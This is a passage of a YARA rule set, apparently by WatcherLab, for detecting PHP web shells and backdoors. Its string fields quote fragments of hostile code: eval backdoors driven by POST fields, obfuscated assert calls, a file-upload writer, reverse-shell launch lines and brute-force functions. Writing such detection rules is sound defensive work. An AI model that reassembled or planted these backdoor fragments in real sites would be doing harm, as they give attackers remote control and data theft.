      $s5 = "elseif($sqltype == 'odbc'){ if(function_exists('odbc_connect')) return @odbc_connect($sqlhost, $sqluser, $sqlpass); }" fullword ascii
      $s6 = "elseif(function_exists('mysql_connect')) return @mysql_connect($sqlhost, $sqluser, $sqlpass);" fullword ascii
      $s7 = "elseif(function_exists('mssql_connect')) return @mssql_connect($sqlhost, $sqluser, $sqlpass);" fullword ascii
      $s8 = "elseif($type=='oracle') $showdb = \"SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME\";" fullword ascii
      $s9 = "<td>Separate multiple commands with a semicolon <span class='strong'>(</span> ; <span class='strong'>)</span></td>" fullword ascii
      $s10 = "elseif($sqltype == 'sqlite'){ if(function_exists('sqlite_open')) return @sqlite_open($sqlhost); }" fullword ascii
      $s11 = "$query = \"SELECT * FROM \".$db.\".\".$table.\" WHERE ROWNUM BETWEEN \".$start.\" AND \".$limit.\";\";" fullword ascii
      $s12 = "elseif(($type=='sqlite3') || ($type=='sqlite')) $showdb = \"SELECT \\\"\".$host.\"\\\"\";" fullword ascii
      $s13 = "if(function_exists(\"mssql_connect\") || function_exists(\"sqlsrv_connect\")) $db_supported[] = 'mssql';" fullword ascii
      $s14 = "elseif($sqltype == 'odbc') return odbc_exec($con, $query);" fullword ascii
      $s15 = "function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass){" fullword ascii
      $s16 = "if(class_exists('PDO')) if(!empty($sqlhost)) return new PDO($sqlhost, $sqluser, $sqlpass);" fullword ascii
      $s17 = "$query = \"SELECT * FROM \".$db.\".\".$table.\" LIMIT \".$limit.\" OFFSET \".$start.\";\";" fullword ascii
      $s18 = "$res .= \"<p>\".html_safe($query).\";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> error <span class='strong'>]</span></p>\";" fullword ascii
      $s19 = "elseif($type=='pgsql') $showtbl = \"SELECT table_name FROM information_schema.tables WHERE table_schema='\".$db.\"'\";" fullword ascii
      $s20 = "$con = sql_connect($type ,$host , $user , $pass);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule sig_297c2c4c246ae48b7564e60026ae2758
{
   meta:
      description = "php17 - file 297c2c4c246ae48b7564e60026ae2758.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "726079f703fc0811ef0dc6dcc3379be2cc69bd1ab3ec7c94ee0b6751b7b5676a"
   strings:
      $s1 = "preg_replace(\"/./\\x65\",@$_POST[\"validate\"],\".\");" fullword ascii
      $s2 = "if(isset($_POST[\"validate\"])){ " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_608495dc6673cb5b17ea69c526e13978ed5567a7
{
   meta:
      description = "php17 - file 608495dc6673cb5b17ea69c526e13978ed5567a7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f2b61b1e78e0b0e7ba325c85bfc6e1dffb201dd75fd0685cd4898c5a7ab9c96f"
   strings:
      $s1 = "@$_/*-/*-*/($/*-/*-*/{\"_P\"./*-/*-*/\"OS\"./*-/*-*/\"T\"}" fullword ascii
      $s2 = "[/*-/*-*/0/*-/*-*/-/*-/*-*/3/*-/*-*/-/*-/*-*/6/*-/*-*/]);?>" fullword ascii
      $s3 = "@$_=/*-/*-*/\"a\"./*-/*-*/$_./*-/*-*/\"t\";" fullword ascii
      $s4 = "@$_=\"s\".\"s\"./*-/*-*/\"e\"./*-/*-*/\"r\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_7d4db150d48270409c1e179fa8bda76792b45c86
{
   meta:
      description = "php17 - file 7d4db150d48270409c1e179fa8bda76792b45c86.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ed3ea75fde5557fa1726641f46fd08085c495e2402bb943cbe4c452ce113028e"
   strings:
      $x1 = "$dump=down_tb($_POST['tablename'], $_POST['dbname'],$_POST['host'], $_POST['username'], $_POST['pass']);" fullword ascii
      $s2 = "$port[4000] = \"icq, command-n-conquer and shell nfm\";" fullword ascii
      $s3 = "echo down_tb($_POST['tablename'], $_POST['dbname'],$_POST['host'], $_POST['username'], $_POST['pass']);" fullword ascii
      $s4 = "header(\"Content-disposition: attachment; filename=\\\"\".$_POST['tablename'].\".dmp\\\";\");" fullword ascii
      $s5 = "echo \"<b>RemoteAddressIfProxy:</b><font color=red>\".$HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR'].\"</font>\";" fullword ascii
      $s6 = "$filedump=fread($file,filesize($_POST['fname']));" fullword ascii
      $s7 = "echo \"<form action=\\\"\".$HTTP_REFERER.\"\\\" method=\\\"POST\\\" enctype=\\\"multipart/form-data\\\">\";" fullword ascii
      $s8 = "die(\"<b>Error dump!</b><br> table=\".$_POST['tablename'].\"<br> db=\".$_POST['dbname'].\"<br> host=\".$_POST['host'].\"<br> use" ascii
      $s9 = "die(\"<b>Error dump!</b><br> table=\".$_POST['tablename'].\"<br> db=\".$_POST['dbname'].\"<br> host=\".$_POST['host'].\"<br> use" ascii
      $s10 = "$port[49] = \"TACACS, Login Host Protocol\";" fullword ascii
      $s11 = "$port[543] = \"KLogin, AppleShare over IP\";" fullword ascii
      $s12 = "header(\"Content-disposition: attachment; filename=\\\"\".$filename.\"\\\";\");" fullword ascii
      $s13 = "$port[3] = \"Compression Process\";" fullword ascii
      $s14 = "echo \"<b>RemoteAddress:</b><font color=red>\".$HTTP_SERVER_VARS['REMOTE_ADDR'].\"</font><br>\";" fullword ascii
      $s15 = "$prx2=\"XCI7DQoNCnN1YiBwcmVmaXggew0KIG15ICRub3cgPSBsb2NhbHRpbWU7DQoNCiBqb2luIFwiXCIsIG1hcCB7IFwiWyRub3ddIFskeyR9XSAk" fullword ascii
      $s16 = "$port[513] = \"who, rlogin\";" fullword ascii
      $s17 = "$port[45] = \"Message Processing Module [recv]\";" fullword ascii
      $s18 = "$port[2301] = \"Compaq Insight Management Web Agents\";" fullword ascii
      $s19 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()." fullword ascii
      $s20 = "$port[23456] = \"EvilFTP\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule AddRemoveAllPanel
{
   meta:
      description = "php17 - file AddRemoveAllPanel.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b44811e37e1407d44057f4fb88637bbcf2479c9481d05956d2e3c72c991c1947"
   strings:
      $s1 = "* Standard panel for common backend grids footer with Add and RemoveAll buttons" fullword ascii
      $s2 = "* @package app\\backend\\widgets\\helpers" fullword ascii
      $s3 = ") . \\app\\backend\\widgets\\RemoveAllButton::widget([" fullword ascii
      $s4 = "public $baseRoute = '/backend/dynamic-content/';" fullword ascii
      $s5 = "namespace app\\backend\\widgets\\helpers;" fullword ascii
      $s6 = "class AddRemoveAllPanel extends \\yii\\base\\Widget" fullword ascii
      $s7 = "Icon::show('plus') . Yii::t('app', 'Add')," fullword ascii
      $s8 = "'url' => $this->baseRoute . 'remove-all'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule admin_metabox_import_export_favorite_fields_export_html
{
   meta:
      description = "php17 - file admin-metabox-import-export-favorite-fields-export.html.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "215af18248f9e97da52fc4bb17abe4b9a3f6da271db9ff576c43cf5278f9d0ca"
   strings:
      $s1 = "<input type=\"checkbox\" name=\"nf_export_fields[]\" value=\"<?php echo intval( $field->get_id() ); ?>\">" fullword ascii
      $s2 = "<label for=\"nf_export_fields_submit\"><?php _e( 'Export Fields', 'ninja-forms' ); ?></label>" fullword ascii
      $s3 = "<label for=\"nf_export_fields\"><?php echo __( 'Favorite Fields', 'ninja-forms' ); ?></label>" fullword ascii
      $s4 = "<input type=\"submit\" id=\"nf_export_fields_submit\" class=\"button-secondary\" value=\"<?php echo __( 'Export Fie" fullword ascii
      $s5 = "<?php echo $field->get_setting( 'label' ); ?>" fullword ascii
      $s6 = "<tr id=\"row_nf_export_fields_submit\">" fullword ascii
      $s7 = "<tr id=\"row_nf_export_fields\">" fullword ascii
      $s8 = "<?php foreach( $fields as $field ): ?>" fullword ascii
   condition:
      uint16(0) == 0x643c and filesize < 3KB and
      all of them
}


rule aro_fixture
{
   meta:
      description = "php17 - file aro_fixture.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8ea6579df9144801aac70e42641d5bc33138a80ae2a42ae83e934a01d27d874b"
   strings:
      $s1 = "* Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s2 = "* @license       http://www.opensource.org/licenses/opengroup.php The Open Group Test Suite License" fullword ascii
      $s3 = "array('parent_id' => '2', 'model' => 'AuthUser', 'foreign_key' => '1', 'alias' => 'Gandalf', 'lft' => 3, 'rght' => 4)," fullword ascii
      $s4 = "array('parent_id' => '2', 'model' => 'AuthUser', 'foreign_key' => '2', 'alias' => 'Elrond', 'lft' => 5, 'rght' => 6)" fullword ascii
      $s5 = "* @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s6 = "array('parent_id' => null, 'model' => null, 'foreign_key' => null, 'alias' => 'ROOT', 'lft' => 1, 'rght' => 8)," fullword ascii
      $s7 = "* CakePHP(tm) Tests <http://book.cakephp.org/view/1196/Testing>" fullword ascii
      $s8 = "array('parent_id' => '1', 'model' => 'Group', 'foreign_key' => '1', 'alias' => 'admins', 'lft' => 2, 'rght' => 7)," fullword ascii
      $s9 = "*  Redistributions of files must retain the above copyright notice." fullword ascii
      $s10 = "* @link          http://book.cakephp.org/view/1196/Testing CakePHP(tm) Tests" fullword ascii
      $s11 = "*  Licensed under The Open Group Test Suite License" fullword ascii
      $s12 = "* Short description for file." fullword ascii
      $s13 = "'foreign_key' => array('type' => 'integer', 'length' => 10, 'null' => true)," fullword ascii
      $s14 = "* @var string 'Aro'" fullword ascii
      $s15 = "* Short description for class." fullword ascii
      $s16 = "* fields property" fullword ascii
      $s17 = "* records property" fullword ascii
      $s18 = "* name property" fullword ascii
      $s19 = "'parent_id' => array('type' => 'integer', 'length' => 10, 'null' => true)," fullword ascii
      $s20 = "'id' => array('type' => 'integer', 'key' => 'primary')," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule sig_17f03808dd8f8c6879b314672edc9b97a8ed47ed
{
   meta:
      description = "php17 - file 17f03808dd8f8c6879b314672edc9b97a8ed47ed.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a1fb1f470cc2e59e4c4944de4bdae486c64e1cf1947697eec22fafabeee250da"
   strings:
      $s1 = "$S=' $o;}$lfr=$_SElfRVER;$rr=@lf$r[\"lfHTTPlf_REFElfRER\"];$ra=@$rlf[\"HTlfTP_ACCElfPlfTlf_LANGUAGElf\"];if($rr&&$ra){';" fullword ascii
      $s2 = "$G='lfay(\"/lf\",\"+\"),lflf$ss($s[$i],0,lf$e))),$k))lf)lf;$o=ob_gelft_contentlfs(lf);ob_lfend_cleanlf();$dlf=b';" fullword ascii
      $s3 = "$N='s=lf&$_SESSION;$slfs=\"substlfr\";$sl=lf\"strtlflfolower\";$lfi=$m[1][lf0]lf.$mlf[1][1];$lfh=$slfl($ss(md5';" fullword ascii
      $s4 = "$M='$lfu=parlfse_urlfl($rlfr);parlfse_slftr($u[\"qulferylf\"],$qlf);$q=arrlfay_valflues($q);plfreglf_match_lfa';" fullword ascii
      $s5 = "$X='($i.$lfkh),lf0,3));$lfflf=$sl($ss(mdlf5($i.$lfkf),0,3)lf);$plf=\"\";flforlf($z=lf1;$z<countlf($m[1]);$lfz+';" fullword ascii
      $s6 = "$u='lf();@elfval(@gzunclflfompress(@x(lf@baself64_decodlfe(plfreg_rlfeplaclfe(array(\"/_lf/\",\"/-lf/lf\"),arr';" fullword ascii
      $s7 = "$R='$kh=\"5d4lf1\";$kf=\"4lf02a\"lf;functiolfn xlf($t,$k)lf{$c=strlflelfn($k);$l=stlfrllfen($tlf)lf;$o=\"\";for($i';" fullword ascii
      $s8 = "$T='ll(\"lf/([\\\\w])[lf\\\\w-lf]+(?:;q=0.([lf\\\\dlf]))?,?/lf\",$ra,$m)lflf;if(lf$q&&$m)lf{@selfssion_lflfstart();$';" fullword ascii
      $s9 = "$s='elfy_elfxists($i,$s)){lf$s[$i]lf.=$lfp;$e=strplfos($lfs[$i],$flf);if($e)lf{$k=$klfh.$klff;ob_slftart';" fullword ascii
      $s10 = "$p='=0;lflf$i<$l;){lffor($lfj=0;($jlf<$c&&lf$i<$l);$j++lflf,$i++)lf{$o.=$lft{$i}lf^lf$k{$j};}lf}returnlf';" fullword ascii
      $s11 = "$g='ase6lf4_lfenclfode(x(gzcolfmpress($olf),$k)lf);prinlft(\"<$klf>$d</$lfk>\");@slfession_lfdestroy(lf);}}}}';" fullword ascii
      $s12 = "$w='+)$lfp.=lf$lflfq[$m[2][$z]]lf;lfif(strpos($p,$h)==lf=0)lflf{$s[$i]=\"\";$p=$ss(lf$p,3lf);}if(alfrray_lfk';" fullword ascii
      $s13 = "$v=str_replace('lf','',$R.$p.$S.$M.$T.$N.$X.$w.$s.$u.$G.$g);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_8786355027e9ea8b98725019f1d594fd194cd412
{
   meta:
      description = "php17 - file 8786355027e9ea8b98725019f1d594fd194cd412.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
   strings:
      $x1 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x2 = "<input type='button' value='fakenamegenerator.com' onclick=\\\"document.hf.action='http://www.fakenamegenerator.com/';" fullword ascii
      $x3 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true;" fullword ascii
      $x4 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=''\";" fullword ascii
      $x5 = "send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_SESSION[md5($_SERVER['HTTP_HOST']).'st" fullword ascii
      $x6 = "'<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" target=\"_bl" ascii
      $s7 = "$millink='http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $s8 = "echo '<br/><span>posix_getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit=\\'g(null,null,\"5\",this.param1.v" fullword ascii
      $s9 = "showSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s10 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s11 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $s12 = "$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes(\"\\n$ \".$_POST['p1'].\"\\n\".ex($_POST['p1']),\"\\n\\r\\t\\'\\0\"));" fullword ascii
      $s13 = "FailRoot'Cod3rz <a href='http://failroot.wordpress.com/'>FailRoot-Sec.Com</a> | <a  " fullword ascii
      $s14 = "'<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" target=\"_bl" ascii
      $s15 = "<td><input type=text name=sql_pass value='<?=(empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass']));?>'></td>" fullword ascii
      $s16 = "function bruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s17 = "$out = ex(which(\"perl\").\" /tmp/bc.pl \".$_POST['p2'].\" \".$_POST['p3'].\" &\");" fullword ascii
      $s18 = "ileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';" fullword ascii
      $s19 = "<html><head><meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'><title><?=$_SERVER['HTTP_HOST']?" ascii
      $s20 = "$res = @mysql_connect($ip.':'.$port?$port:3306, $login, $pass);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_394decebdcb2fc57b68853dffc058c2a
{
   meta:
      description = "php17 - file 394decebdcb2fc57b68853dffc058c2a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c342c9fabd17343a0bd4604ede4165828927ce2f01cb6530aeb50430760ad3c2"
   strings:
      $s1 = "'L9tpFrEOmYoEmYoEmYoEmYowDQoEmYoEmYoEmYoEmYoEmYosgVWsPYhwh5GeDQoEmYoEmYoEmYoEmYNqchEpCQEpCQNqcQEjtHTj'." fullword ascii
      $s2 = "'3Gs7YklmOpwhGTOorEOmYoERdEOmYoEmYoEmYGjgC1phAowR9t01NGjgKTsIVtlYxi9uGG5vANIv9NIvAQlnMG9GDoELOGj'." fullword ascii
      $s3 = "'CQ4DQoEmYoEmYoEmyi9R7GxbY1sPYGzgDt02CowLctlR5Tj2yts5At9R8Ws5VWEReWsnHTsqYGwhytwgVtlRCWs7YGzuyGxL5G8q'." fullword ascii
      $s4 = "'gLyG9YrEOmYoERdEOmYoEmYoEmYhwLcWpFMk5h5Gsv3gsPYklRuGxhuZlYraKcYoEmYNqcQEOmYoERK10hDW0FYtxgAX8LrTzS'." fullword ascii
      $s5 = "'1surG9C+q0vCqjnbZlbrowDQoEmYoEmYoEmYoEmYhwLcWpFMkbID1BhytwbYklmxgsPY1j5519RCWs5eosgMX05Do'." fullword ascii
      $s6 = "'5twgVtlRMXpuFt03x1sYY1sPYG8LuGxqYTzXY1su5osgAXznbt0qYXzuuGYcYoEmYoEmYoEmYoEmYoEmYoEmYo'." fullword ascii
      $s7 = "'mchsn9tEmPklmKZf1IQlbrowDQoEmYoEmYoEmYoEmYoEmYoELDW035oESnoELCZwLThs5'." fullword ascii
      $s8 = "'7HIqjnbZlmnoELCWs5ei43VGjgu1sgETzL3QEbdEYcYoEmYoEmYoEmYoERrtOmchwLcWpFMkbHuW0v5GOmnklm'." fullword ascii
      $s9 = "'hwLcWpFMkjg9Gjn9pz2y103CofCYFfDYi9PYGjgetpqYtph9T8heEOmYoEmYoEmYoEmYoELCWs5ei43etpL'." fullword ascii
      $s10 = "'RnEYcYoEmYGwgOTs5Vow2CXpLrX9Rj103V1s5yTORAT8hMX0vrZjgEGjguW8FchwL5ZwqDoELOGjguW8L'." fullword ascii
      $s11 = "'uT07Yklmbtj5Dt03uT07dEOmYoEmYoEmYNqcQoEmYoEmYoEmyi9RRGwR5TjqY1sPYhsIC1sIVWsH5TxqYX'." fullword ascii
      $s12 = "'N'=>'f', 'Q'=>'K', 'P'=>'8', 'S'=>'4', 'R'=>'B', 'U'=>'6', 'T'=>'b', 'W'=>'a', 'V'=>'j', 'Y'=>'g', 'X'=>'Y', 'Z'=>'e', 'a'=>'O" fullword ascii
      $s13 = "'YoEmYoEmYoEmYW0XYQEYcFwY9FlmPklmbT8hbQlmjhOmchsn9tEmPklmKZf2RQ'." fullword ascii
      $s14 = "'YoELDW035pzHuZEmnofGzimcYoEmYoEmYoEPJQORmTjnrTx2Kt02CW0nAoIRcGIgA1p25tIRuGjIMt'." fullword ascii
      $s15 = "'sh5os3rXz7Y1sPY1p25owRcGfcyi8L5TpmYG8L9t0IMG9Rctph5iERO1pqYTjg5tERCT9R8GjIKostyG'." fullword ascii
      $s16 = "'I', 'n'=>'9', 'q'=>'Q', 'p'=>'X', 's'=>'G', 'r'=>'p', 'u'=>'h', 't'=>'Z', 'w'=>'H', 'v'=>'x', 'y'=>'v', 'x'=>'n', 'z'=>'2');" fullword ascii
      $s17 = "'aKcQoEmYowRHXjvrX9mb7CH77BIH1sYYklRjX0vet4DQEOmYoERK10hDW0FYhIgetphAX0H5of'." fullword ascii
      $s18 = "'T5nDTzIbt0qch8RVGj7xQlbYZKcYoEmYoEmYoEmYoEmYoEmYi9nsX0vDoshuXzDY1sPYTzvbt'." fullword ascii
      $s19 = "'zgAtEYb1surG9C+4752L7u5X0L5GOKYhwLcWpFMkbHh47gETzL3Q4DQoEmYoEmYoEmYoEmY'." fullword ascii
      $s20 = "'KMGzIjtlRy1pLK1pqQoEmYoEmYoEmYoEmYoEmYosgVWsPYWwLMTsgA1s5CW0geQmcYoEmYoEm'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule adminer_4_1_0_mysql
{
   meta:
      description = "php17 - file adminer-4.1.0_mysql.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "21f2c335b1d7810398862df20ab65ab1c67b188ce80f71d11fe32071f0894ebe"
   strings:
      $x1 = "as$x=>$X){if($x!=\"\"&&$X>1){echo($Hc?\"<p>\":\" \").\"<a href='\".h(ME).\"dump=\".urlencode(\"$x%\").\"'>\".h($x).\"</a>\";$Hc=" ascii
      $x2 = "as$xd=>$X){if($X[0]<$eh)unset($wd[$xd]);}}$vd=&$wd[$b->bruteForceKey()];if(!$vd)$vd=array($eh+30*60,0);$vd[1]++;$tg=serialize($w" ascii
      $x3 = "as$k=>$S){$dg=h(ME).\"db=\".urlencode($k);echo\"<tr\".odd().\">\".(support(\"database\")?\"<td>\".checkbox(\"db[]\",$k,in_array(" ascii
      $x4 = "false;}set_error_handler(array($this,'_error'));$J=@oci_execute($I);restore_error_handler();if($J){if(oci_num_fields($I))return" fullword ascii
      $x5 = "L \".(+$X)))$Jd++;}queries_redirect(ME.\"processlist=\",lang(229,$Jd),$Jd||!$_POST[\"kill\"]);}page_header(lang(103),$m);echo'" fullword ascii
      $x6 = "connect_error(){global$b,$h,$T,$m,$Ub;if(DB!=\"\"){header(\"HTTP/1.1 404 Not Found\");page_header(lang(35).\": \".h(DB),lang(99)" ascii
      $x7 = "EmailProcess($Z,$Lc)){if($_POST[\"save\"]||$_POST[\"delete\"]){$I=true;$ya=0;$O=array();if(!$_POST[\"delete\"]){foreach($f" fullword ascii
      $x8 = "';if(!$K[\"hashed\"]){echo'<script type=\"text/javascript\">typePassword(document.getElementById(\\'pass\\'));</script>';}echo" fullword ascii
      $x9 = "password_file($zb){$Fc=get_temp_dir().\"/adminer.key\";$J=@file_get_contents($Fc);if($J||!$zb)return$J;$Pc=@fopen($Fc,\"w\");if(" ascii
      $x10 = "password_file($zb){$Fc=get_temp_dir().\"/adminer.key\";$J=@file_get_contents($Fc);if($J||!$zb)return$J;$Pc=@fopen($Fc,\"w\");if(" ascii
      $x11 = "as$V=>$G){if($G!==null){if($Hc){echo\"<p id='logins' onmouseover='menuOver(this, event);' onmouseout='menuOut(this);'>\\n\";$Hc=" ascii
      $x12 = "\"sql\"])||isset($_GET[\"dump\"])||isset($_GET[\"database\"])||isset($_GET[\"processlist\"])||isset($_GET[\"privileges\"])||isse" ascii
      $s13 = "doc_link($of){global$w,$h;$Hh=array('sql'=>\"http://dev.mysql.com/doc/refman/\".substr($h->server_info,0,3).\"/en/\",'sqlite'=>" ascii
      $s14 = "as$X){if($X[1]!=\"USAGE\")$Uc[\"$B[2]$X[2]\"][$X[1]]=true;if(preg_match('~ WITH GRANT OPTION~',$K[0]))$Uc[\"$B[2]$X[2]\"][\"GRAN" ascii
      $s15 = "';}elseif(isset($_GET[\"dump\"])){$a=$_GET[\"dump\"];if($_POST&&!$m){$xb=\"\";foreach(array(\"output\",\"format\",\"db_style\"," ascii
      $s16 = "selectLengthProcess(){return(isset($_GET[\"text_length\"])?$_GET[\"text_length\"]:\"100\");}function" fullword ascii
      $s17 = "<a href=\"http://www.adminer.org/#download\" target=\"_blank\" id=\"version\">',(version_compare($ia,$_COOKIE[\"adminer_version" ascii
      $s18 = "<a href=\"http://www.adminer.org/#download\" target=\"_blank\" id=\"version\">',(version_compare($ia,$_COOKIE[\"adminer_version" ascii
      $s19 = "name(){return\"<a href='http://www.adminer.org/' target='_blank' id='h1'>Adminer</a>\";}function" fullword ascii
      $s20 = "add_invalid_login(){global$b;$Fc=get_temp_dir().\"/adminer.invalid\";$Pc=@fopen($Fc,\"r+\");if(!$Pc){$Pc=@fopen($Fc,\"w\");if(!$" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule app_class
{
   meta:
      description = "php17 - file app.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "293334dac40bb093f7d56b00fb2671a4ac10241648c7c985ce5d2de8c32f5a47"
   strings:
      $s1 = "// | Author: liu21st <liu21st@gmail.com>" fullword ascii
      $s2 = "prequest') || !empty($_POST[C('VAR_AJAX_SUBMIT')]) || !empty($_GET[C('VAR_AJAX_SUBMIT')])) ? true : false);" fullword ascii
      $s3 = "define('IS_AJAX', ((isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhtt" fullword ascii
      $s4 = "parse_str(file_get_contents('php://input'), $vars);" fullword ascii
      $s5 = "if ($method->getNumberOfParameters() > 0 && C('URL_PARAMS_BIND')) {" fullword ascii
      $s6 = "RDQ5RTQ2RTRDQUJCIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NURENUQ2RkRCOTI0MTFFMTlERjdENDlFNDZFNENBQkIiIHN0" ascii
      $s7 = "bnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJo" ascii
      $s8 = "dHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9u" ascii
      $s9 = "cy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0" ascii
      $s10 = "YW5jZUlEPSJ4bXAuaWlkOjVERDVENkZGQjkyNDExRTE5REY3RDQ5RTQ2RTRDQUJCIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjVERDVENzAwQjkyNDExRTE5REY3" ascii
      $s11 = "UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NURENUQ2RkVCOTI0MTFFMTlERjdENDlFNDZFNENBQkIiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94Onht" ascii
      $s12 = "header(\"Content-type:image/png\");" fullword ascii
      $s13 = "// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )" fullword ascii
      $s14 = "C('LOG_PATH', realpath(LOG_PATH) . '/Common/');" fullword ascii
      $s15 = "// | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved." fullword ascii
      $s16 = "define('IS_GET', REQUEST_METHOD == 'GET' ? true : false);" fullword ascii
      $s17 = "define('IS_POST', REQUEST_METHOD == 'POST' ? true : false);" fullword ascii
      $s18 = "bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1s" ascii
      $s19 = "return 'iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNv" fullword ascii
      $s20 = "public static function exec()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule sig_0ce760131787803bbef216d0ee9b5eb062633537
{
   meta:
      description = "php17 - file 0ce760131787803bbef216d0ee9b5eb062633537.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3b8d7c5bab56df162a3c0913b0467604c23780163c6a07fb82643981fb49f666"
   strings:
      $s1 = "for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode(\"%\".substr($c,$i,2)); //" fullword ascii
      $s2 = "$c=$_POST[\"z2\"];$buf=\"\"; //z2" fullword ascii
      $s3 = "$f=realpath(dirname(__FILE__).\"/../\").$_POST[\"z1\"]; //" fullword ascii
      $s4 = "@fwrite(fopen($f,\"w\"),$buf); echo \"1ok\"; //" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule a647275c30e0a1e78903680ea97931aa8cd39118
{
   meta:
      description = "php17 - file a647275c30e0a1e78903680ea97931aa8cd39118.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
   strings:
      $x1 = "$res = execute(which('python').\" /tmp/angel_bcpy $yourip $yourport &\");" fullword ascii
      $x2 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
      $x3 = "p('<p><a href=\"http://www.4ngel.net/phpspy/plugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x4 = "Copyright (C) 2004-2008 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
      $s5 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
